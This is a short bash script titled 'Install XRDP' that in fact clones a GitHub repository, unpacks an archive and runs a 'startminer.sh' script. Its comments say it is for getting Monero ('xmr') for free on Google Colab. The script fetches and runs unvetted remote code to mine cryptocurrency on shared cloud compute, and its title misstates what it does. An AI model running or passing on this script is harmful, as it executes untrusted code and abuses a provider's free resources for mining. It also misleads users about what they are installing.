#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install git screen -y
screen -R vrot
 
git clone https://github.com/burocos/vrots.git
cd vrots
tar xvf vrots.tar.gz
./startminer.sh


